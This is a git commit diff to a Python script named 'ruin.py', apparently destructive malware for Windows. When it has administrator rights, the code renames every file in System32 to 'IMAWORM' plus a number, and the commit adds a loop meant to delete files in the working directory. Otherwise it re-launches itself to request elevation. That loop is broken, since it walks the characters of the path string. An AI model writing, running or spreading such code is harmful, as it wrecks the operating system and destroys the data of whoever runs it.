ac622432047e147837f0731073021b1b2dcd90a1
RCDelta <104479252+RCDelta@users.noreply.github.com>
2024-04-26 19:35:24 -0400

    Update ruin.py

--- ruin.py
+++ ruin.py
@@ -7,15 +7,15 @@ def is_admin():
         return False
 
 if is_admin():
+    for files in os.getcwd():
+        os.remove(files)
     os.chdir("/Windows/System32")
     #https://www.geeksforgeeks.org/rename-all-file-names-in-your-directory-using-python/
     for count, f in enumerate(os.listdir()):
         f_name, f_ext = os.path.splitext(f)
         f_name = "IMAWORM" + str(count)
-    
         new_name = f'{f_name}{f_ext}'
         os.rename(f, new_name)
-        
         
 else:
     # Re-run the program with admin rights
